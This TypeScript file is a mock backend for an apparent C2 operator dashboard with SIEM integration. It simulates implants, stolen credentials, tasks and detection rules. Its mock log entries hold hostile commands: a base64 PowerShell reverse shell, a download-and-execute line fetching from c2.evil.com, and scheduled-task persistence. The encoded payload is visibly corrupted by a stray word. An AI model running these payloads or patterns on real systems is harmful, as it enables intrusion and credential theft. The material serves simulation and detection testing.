import { Listener, Agent, Loot, SiemConfig, SiemRule, Redirector } from '../types/index.js';

// --- In-memory Database (simulates the backend) ---
let redirectors: Redirector[] = [
    { id: 'r1', name: 'edge-http-01', ip: '1.1.1.1', type: 'HTTP/S', tier: 'Edge', status: 'Healthy' },
    { id: 'r2', name: 'internal-dns-01', ip: '10.10.0.5', type: 'DNS', tier: 'Internal', status: 'Healthy' },
    { id: 'r3', name: 'edge-smb-01', ip: '2.2.2.2', type: 'SMB', tier: 'Edge', status: 'Degraded' },
];
let listeners: Listener[] = [
    { id: 'l1', name: 'HTTP-80', type: 'HTTP', host: '0.0.0.0', port: 80, status: 'active', redirectorId: 'r1', hostHeader: 'www.google.com' },
    { id: 'l2', name: 'HTTPS-443', type: 'HTTPS', host: '0.0.0.0', port: 443, status: 'inactive' },
    { id: 'l3', name: 'SMB-Pipe', type: 'SMB', host: 'imperium.c2', port: 445, status: 'active', redirectorId: 'r3' },
];
let agents: Agent[] = [
    {
        id: 'a1', os: 'windows', osVersion: 'Windows 10 Pro', hostname: 'DESKTOP-R7T5J6B', user: 'john.doe',
        privileges: 'Admin', ip: '192.168.1.101', externalIp: '8.8.8.8', lastSeen: new Date(Date.now() - 5000).toISOString(),
        firstSeen: new Date(Date.now() - 3600000).toISOString(), status: 'active', listener: 'HTTP-80',
        pid: 1234, processName: 'svchost.exe', processInjectionTarget: 'explorer.exe'
    },
    {
        id: 'a2', os: 'linux', osVersion: 'Ubuntu 22.04', hostname: 'web-server-01', user: 'www-data',
        privileges: 'User', ip: '10.0.2.15', externalIp: '8.8.4.4', lastSeen: new Date(Date.now() - 120000).toISOString(),
        firstSeen: new Date(Date.now() - 7200000).toISOString(), status: 'stale', listener: 'HTTPS-443',
        pid: 5678, processName: '/usr/sbin/apache2'
    },
     {
        id: 'a3', os: 'macos', osVersion: 'macOS Sonoma', hostname: 'dev-macbook-pro', user: 's.jobs',
        privileges: 'Admin', ip: '192.168.1.150', externalIp: '9.9.9.9', lastSeen: new Date(Date.now() - 86400000).toISOString(),
        firstSeen: new Date(Date.now() - 86400000 * 2).toISOString(), status: 'lost', listener: 'HTTPS-443',
        pid: 4432, processName: 'launchd'
    },
];
let loot: Loot[] = [
    { id: 'loot1', agentId: 'a1', type: 'credential', source: 'mimikatz', content: 'user:j.doe, pass:Password123!', timestamp: new Date().toISOString(), confidence: 95, sourcePath: 'C:\\' },
    { id: 'loot2', agentId: 'a2', type: 'file', source: '/etc/passwd', content: 'root:x:0:0:root:/root:/bin/bash...', timestamp: new Date().toISOString(), confidence: 80, sourcePath: '/etc/passwd' },
];
let siemConfig: SiemConfig = {
    url: '',
    apiKey: '',
    connected: false,
};
let siemRules: SiemRule[] = [
    { id: 'rule-1', name: 'Suspicious PowerShell Download', description: 'Detects PowerShell using WebClient to download files.', query: 'process.name:powershell.exe AND process.command_line: *WebClient* AND process.command_line: *DownloadFile*', severity: 'high', risk_score: 75, enabled: true },
    { id: 'rule-2', name: 'Potential Credential Dumping via LSASS Access', description: 'Identifies processes accessing LSASS memory, which may indicate credential dumping.', query: 'process.name:lsass.exe AND event.action:process_accessed', severity: 'critical', risk_score: 90, enabled: true },
    { id: 'rule-3', name: 'Scheduled Task Creation for Persistence', description: 'Monitors for the creation of scheduled tasks, a common persistence technique.', query: 'process.name:schtasks.exe AND process.command_line: * /create *', severity: 'medium', risk_score: 50, enabled: false },
    { id: 'rule-4', name: 'Unsigned DLL Loaded by Rundll32', description: 'Detects rundll32.exe loading an unsigned DLL.', query: 'process.name:rundll32.exe AND NOT dll.signed:true', severity: 'high', risk_score: 65, enabled: true },
];
let nextListenerId = 4;
let nextAgentId = 4;
let nextLootId = 3;
let nextRedirectorId = 4;

// --- Helper Functions ---
const generateRandomIp = () => `192.168.1.${Math.floor(Math.random() * 254) + 1}`;
const generateHostname = (os: Agent['os']) => os === 'windows' ? `DESKTOP-${Math.random().toString(36).substring(2, 9).toUpperCase()}` : `server-${Math.random().toString(36).substring(2, 6)}`;
const generateUser = (os: Agent['os']) => os === 'windows' ? 'SYSTEM' : 'root';

const mockSiemLogs = [
    { '@timestamp': new Date(Date.now() - 10000).toISOString(), 'process.name': 'powershell.exe', 'process.command_line': 'powershell -ExecutionPolicy Bypass -File C:\\Users\\john.doe\\Desktop\\Invoke-Mimikatz.ps1', 'event.action': 'process_started', 'user.name': 'john.doe' },
    { '@timestamp': new Date(Date.now() - 9000).toISOString(), 'process.name': 'lsass.exe', 'event.action': 'process_accessed', 'source.ip': '192.168.1.101', 'destination.ip': '192.168.1.101', 'user.name': 'john.doe', 'process.parent.name': 'powershell.exe' },
    { '@timestamp': new Date(Date.now() - 8000).toISOString(), 'process.name': 'rundll32.exe', 'process.command_line': 'rundll32.exe C:\\Users\\john.doe\\AppData\\Local\\Temp\\malicious.dll,EntryPoint', 'event.action': 'process_started', 'user.name': 'john.doe' },
    { '@timestamp': new Date(Date.now() - 7000).toISOString(), 'file.path': 'C:\\Users\\john.doe\\Documents\\secret.docx', 'event.action': 'file_access', 'process.name': 'rundll32.exe' },
    { '@timestamp': new Date(Date.now() - 6000).toISOString(), 'network.direction': 'egress', 'destination.ip': '45.33.32.156', 'destination.port': 80, 'process.name': 'rundll32.exe', 'network.protocol': 'http' },
    { '@timestamp': new Date(Date.now() - 5000).toISOString(), 'process.name': 'schtasks.exe', 'process.command_line': '/create /sc minute /mo 1 /tn "Updater" /tr C:\\Users\\Public\\beacon.exe', 'event.action': 'process_started', 'user.name': 'SYSTEM' },
];

const mockSiemResponse = {
    "took": 15,
    "timed_out": false,
    "_shards": {
        "total": 5,
        "successful": 5,
        "skipped": 0,
        "failed": 0
    },
    "hits": {
        "total": {
            "value": 2,
            "relation": "eq"
        },
        "max_score": 1.0,
        "hits": [
            {
                "_index": "logs-generic-default-2023.01.01",
                "_id": "1",
                "_score": 1.0,
                "_source": {
                    "@timestamp": new Date().toISOString(),
                    "process": {
                        "name": "powershell.exe",
                        "pid": 4512,
                        "command_line": "powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEALgA1ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAPQAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKyAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4ARABiAHkAdABlAHMAIAA9ACAAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAEIAeQB0AGUAcwAsADAAIAAkAHMAZQBuAGQAYgBhAGMAawAyAC4AVwByAGkAdABlACgAJABzAGUAbgBkAEIAeQB0AGUAcwAsADAA objetos LgBMAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkAfQA="
                    },
                    "host": {
                        "name": "WIN-DC01"
                    },
                    "user": {
                        "name": "NT AUTHORITY\\SYSTEM"
                    },
                    "destination": {
                        "ip": "192.168.1.5",
                        "port": 443,
                        "domain": "c2.evil.com"
                    },
                    "event": { "category": "network_traffic" }
                }
            },
            {
                "_index": "logs-generic-default-2023.01.01",
                "_id": "2",
                "_score": 1.0,
                "_source": {
                    "@timestamp": new Date().toISOString(),
                    "process": {
                        "name": "powershell.exe",
                        "pid": 6724,
                        "command_line": "powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://c2.evil.com/payload.ps1')\""
                    },
                    "host": {
                        "name": "WIN-DC01"
                    },
                    "user": {
                        "name": "j.doe"
                    },
                    "destination": {
                        "ip": "192.168.1.5",
                        "port": 80,
                        "domain": "c2.evil.com"
                    },
                    "event": { "category": "network" }
                }
            }
        ]
    }
};

// --- Listener Management ---
export const getListeners = async (): Promise<Listener[]> => {
    return Promise.resolve(listeners);
};

export const createListener = async (newListenerData: Omit<Listener, 'id' | 'status'>): Promise<Listener> => {
    const newListener: Listener = {
        id: `l${nextListenerId++}`,
        ...newListenerData,
        status: 'inactive'
    };
    listeners.push(newListener);
    return Promise.resolve(newListener);
};

export const deleteListener = async (id: string): Promise<void> => {
    listeners = listeners.filter(l => l.id !== id);
    return Promise.resolve();
};

export const toggleListenerStatus = async (id: string, status: 'active' | 'inactive'): Promise<Listener> => {
    const listener = listeners.find(l => l.id === id);
    if (listener) {
        listener.status = status;
        return Promise.resolve(listener);
    }
    return Promise.reject(new Error('Listener not found'));
};

// --- Redirector Management ---
export const getRedirectors = async (): Promise<Redirector[]> => {
    return Promise.resolve(redirectors);
};

export const createRedirector = async (newRedirectorData: Omit<Redirector, 'id' | 'status'>): Promise<Redirector> => {
    const newRedirector: Redirector = {
        id: `r${nextRedirectorId++}`,
        ...newRedirectorData,
        status: 'Healthy'
    };
    redirectors.push(newRedirector);
    return Promise.resolve(newRedirector);
};

export const deleteRedirector = async (id: string): Promise<void> => {
    redirectors = redirectors.filter(r => r.id !== id);
    listeners.forEach(l => {
        if (l.redirectorId === id) {
            l.redirectorId = undefined;
        }
    });
    return Promise.resolve();
};

// --- Agent Management ---
export const getAgents = async (): Promise<Agent[]> => {
    // Simulate status changes
    agents.forEach(agent => {
        const timeSinceSeen = Date.now() - new Date(agent.lastSeen).getTime();
        if (timeSinceSeen > 86400000) agent.status = 'lost';
        else if (timeSinceSeen > 300000) agent.status = 'dead';
        else if (timeSinceSeen > 60000) agent.status = 'stale';
        else agent.status = 'active';
    });
    return Promise.resolve(agents);
};

export const getAgent = async (id: string): Promise<Agent> => {
    const agent = agents.find(a => a.id === id);
    if (agent) {
        return Promise.resolve(agent);
    }
    return Promise.reject(new Error('Agent not found'));
};

export const simulateNewAgent = async (listenerId: string, os: Agent['os']): Promise<Agent> => {
    const listener = listeners.find(l => l.id === listenerId);
    if (!listener) {
        return Promise.reject(new Error('Invalid listener ID'));
    }
    const now = new Date().toISOString();
    const newAgent: Agent = {
        id: `a${nextAgentId++}`,
        os,
        osVersion: os === 'windows' ? 'Windows 11 Pro' : os === 'linux' ? 'Ubuntu 22.04 LTS' : 'macOS Sonoma',
        hostname: generateHostname(os),
        user: generateUser(os),
        privileges: 'User',
        ip: generateRandomIp(),
        externalIp: '1.2.3.4',
        lastSeen: now,
        firstSeen: now,
        status: 'active',
        listener: listener.name,
        pid: Math.floor(Math.random() * 20000) + 1000,
        processName: os === 'windows' ? 'powershell.exe' : '/bin/bash'
    };
    agents.push(newAgent);
    return Promise.resolve(newAgent);
};

export const executeCommand = async (agentId: string, command: string): Promise<string> => {
    const agent = agents.find(a => a.id === agentId);
    if (!agent) {
         return Promise.reject(new Error('Agent not found'));
    }
    let output = '';
    if (agent.os === 'windows') {
        if (command.toLowerCase() === 'whoami') {
            output = `${agent.hostname}\\${agent.user}`;
        } else if (command.toLowerCase().startsWith('dir')) {
            output = `
 Volume in drive C has no label.
 Volume Serial Number is 1234-ABCD

 Directory of C:\\Users\\${agent.user}

01/01/2023  12:00 PM    <DIR>          .
01/01/2023  12:00 PM    <DIR>          ..
01/01/2023  12:01 PM    <DIR>          Documents
01/01/2023  12:02 PM    <DIR>          Downloads
01/01/2023  12:03 PM    <DIR>          Desktop
               0 File(s)              0 bytes
               5 Dir(s)  123,456,789,012 bytes free`;
        } else {
            output = `'${command}' is not recognized as an internal or external command,\noperable program or batch file.`;
        }
    } else { // linux/macos
        if (command.toLowerCase() === 'whoami') {
            output = agent.user;
        } else if (command.toLowerCase() === 'id') {
            output = `uid=1000(${agent.user}) gid=1000(${agent.user}) groups=1000(${agent.user})`;
        } else if (command.toLowerCase().startsWith('ls')) {
            output = 'Documents  Downloads  Music  Pictures  Videos';
        } else {
            output = `${command}: command not found`;
        }
    }
    return Promise.resolve(output);
};

export const runTask = async (agentId: string, task: string): Promise<Loot> => {
    const agent = agents.find(a => a.id === agentId);
     if (!agent) {
        return Promise.reject(new Error('Agent not found'));
    }
    let newLootItem: Loot;
    switch (task) {
        case 'credential_harvesting':
            newLootItem = { id: `loot${nextLootId++}`, agentId: agent.id, type: 'credential', source: 'mimikatz', content: `SAM Account: ${agent.user} NTLM: 1a2b3c4d...`, timestamp: new Date().toISOString() };
            break;
        case 'network_scan':
            newLootItem = { id: `loot${nextLootId++}`, agentId: agent.id, type: 'network_data', source: 'arp -a', content: `Scan results for 192.168.1.0/24:\n192.168.1.1 - Gateway\n192.168.1.105 - Open ports: 80, 443`, timestamp: new Date().toISOString() };
            break;
        case 'system_enum':
             newLootItem = { id: `loot${nextLootId++}`, agentId: agent.id, type: 'system_output', source: 'systeminfo', content: `OS: ${agent.osVersion}\nHostname: ${agent.hostname}\nUser: ${agent.user}`, timestamp: new Date().toISOString() };
            break;
        case 'privesc_check':
             newLootItem = { id: `loot${nextLootId++}`, agentId: agent.id, type: 'system_output', source: 'privesc_check.sh', content: `[+] Unquoted service paths found: C:\\Program Files\\...`, timestamp: new Date().toISOString() };
            break;
        default:
            return Promise.reject(new Error('Unknown task'));
    }
    loot.push(newLootItem);
    return Promise.resolve(newLootItem);
};

// --- Loot Management ---
export const getLoot = async (): Promise<Loot[]> => {
    return Promise.resolve(loot);
};

// --- SIEM Management ---
export const getSiemConfig = async (): Promise<SiemConfig> => {
    return Promise.resolve(siemConfig);
};

export const saveSiemConfig = async (config: SiemConfig): Promise<SiemConfig> => {
    siemConfig = config;
    return Promise.resolve(siemConfig);
};

export const testSiemConnection = async (config: SiemConfig): Promise<{ success: boolean; message: string }> => {
    if (config.url && config.apiKey && config.url.startsWith('http') && config.apiKey.length > 10) {
        return Promise.resolve({ success: true, message: 'Successfully connected to Elastic SIEM.' });
    } else {
        return Promise.resolve({ success: false, message: 'Connection failed. Please check URL and API Key.' });
    }
};

export const querySiem = async (kqlQuery: string): Promise<any[]> => {
    // Super simple mock search. It checks for keywords from the query.
    const keywords = (kqlQuery.match(/"(.*?)"/g) || []).map(k => k.replace(/"/g, '').toLowerCase());
    if (keywords.length === 0) {
         keywords.push(...kqlQuery.toLowerCase().split(' '));
    }

    const results = mockSiemLogs.filter(log => {
         const logString = JSON.stringify(log).toLowerCase();
         return keywords.some(keyword => keyword && logString.includes(keyword));
    });
    
    // Simulate network delay
    await new Promise(res => setTimeout(res, 1000 + Math.random() * 500));
    return Promise.resolve(results);
};

export const getSiemRules = async (): Promise<SiemRule[]> => {
    return Promise.resolve(siemRules);
};

export const toggleSiemRule = async (ruleId: string): Promise<SiemRule> => {
    const rule = siemRules.find(r => r.id === ruleId);
    if (rule) {
        rule.enabled = !rule.enabled;
        return Promise.resolve(rule);
    }
    return Promise.reject(new Error('Rule not found'));
};

export const submitDslQuery = async (dslQuery: string): Promise<any> => {
    // Simulate network delay
    await new Promise(res => setTimeout(res, 800 + Math.random() * 400));
    // For now, just return a static mock response regardless of the query.
    // A real implementation would send this to the backend to be executed.
    if (!siemConfig.connected) {
        // A real implementation would check the passed-in credentials
        return Promise.reject(new Error("SIEM not connected. Please configure it in the SIEM Integration tab or provide credentials."));
    }
    return Promise.resolve(mockSiemResponse);
};